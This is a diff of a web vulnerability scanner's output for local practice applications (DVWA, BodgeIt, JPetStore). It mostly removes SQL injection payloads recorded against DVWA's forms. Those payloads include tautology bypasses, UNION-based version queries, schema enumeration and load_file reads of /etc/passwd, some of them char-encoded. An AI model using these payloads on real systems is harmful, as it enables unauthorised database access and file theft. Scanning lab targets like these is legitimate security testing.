@@ -18,81 +18,17 @@ Vulnerabilities found on http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/...
 Vulnerabilities found on http://127.0.0.1/dvwa/vulnerabilities/sqli/...
 	SQL Injection
 		Form :
-		'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
 		'||'6
-		' OR 1=1--
 		' OR '1'='1
-		; OR '1'='1'
-		' or 1=1--
-		' or 1=1 /*
 		' or 'a'='a
-		') or ('a'='a
-		'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
-		' having 1=1--
-		' having 1=1--
-		' group by userid having 1=1--
-		' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
-		' or 1 in (select @@version)--
-		' union all select @@version--
-		' OR 'unusual' = 'unusual'
-		' OR 'something' = 'some'+'thing'
-		' OR 'text' = N'text'
-		' OR 'something' like 'some%'
-		' OR 2 > 1
-		' OR 'text' > 't'
-		' OR 'whatever' in ('whatever')
-		' OR 2 BETWEEN 1 and 3
-		' or username like char(37);
-		' union select * from users where login = char(114,111,111,116);
-		' union select
-		'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
-		'; EXEC ('SEL' + 'ECT US' + 'ER')
-		'/**/OR/**/1/**/=/**/1
-		' or 1/*
-		'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
-		' and 1 in (select var from temp)--
-		' union select 1,load_file('/etc/passwd'),1,1,1;
 		1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
-		' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
 ------------------------------------------------------------
 Vulnerabilities found on http://127.0.0.1/dvwa/vulnerabilities/exec/...
 ------------------------------------------------------------
 Vulnerabilities found on http://127.0.0.1/dvwa/vulnerabilities/brute/...
 	SQL Injection
 		Form :
-		'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
-		' OR 1=1--
-		; OR '1'='1'
-		' or 1=1--
-		' or 1=1 /*
-		') or ('a'='a
 		Admin' OR '
-		'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
-		' having 1=1--
-		' having 1=1--
-		' group by userid having 1=1--
-		' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
-		' or 1 in (select @@version)--
-		' union all select @@version--
-		' OR 'unusual' = 'unusual'
-		' OR 'something' = 'some'+'thing'
-		' OR 'text' = N'text'
-		' OR 'something' like 'some%'
-		' OR 2 > 1
-		' OR 'text' > 't'
-		' OR 'whatever' in ('whatever')
-		' OR 2 BETWEEN 1 and 3
-		' or username like char(37);
-		' union select * from users where login = char(114,111,111,116);
-		' union select
-		'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
-		'; EXEC ('SEL' + 'ECT US' + 'ER')
-		'/**/OR/**/1/**/=/**/1
-		' or 1/*
-		'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
-		' and 1 in (select var from temp)--
-		' union select 1,load_file('/etc/passwd'),1,1,1;
-		' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
 ------------------------------------------------------------
 Vulnerabilities found on http://127.0.0.1:8080/bodgeit/search.jsp...
 	Cross site scripting
@@ -109,7 +45,7 @@ Vulnerabilities found on http://127.0.0.1:8080/bodgeit/contact.jsp...
 ------------------------------------------------------------
 Vulnerabilities found on http://127.0.0.1:8080/jpetstore/actions/Catalog.action...
 ------------------------------------------------------------
-Vulnerabilities found on http://127.0.0.1:8080/jpetstore/actions/Account.action;jsessionid=9C112BD26F4817E9437CC80FBC62FDDD?signonForm=...
+Vulnerabilities found on http://127.0.0.1:8080/jpetstore/actions/Account.action;jsessionid=260791120FCAE0598A1C4EFD03D8956B?signonForm=...
 ------------------------------------------------------------
-Vulnerabilities found on http://127.0.0.1:8080/jpetstore/actions/Cart.action;jsessionid=9C112BD26F4817E9437CC80FBC62FDDD?viewCart=...
+Vulnerabilities found on http://127.0.0.1:8080/jpetstore/actions/Cart.action;jsessionid=260791120FCAE0598A1C4EFD03D8956B?viewCart=...
 ------------------------------------------------------------
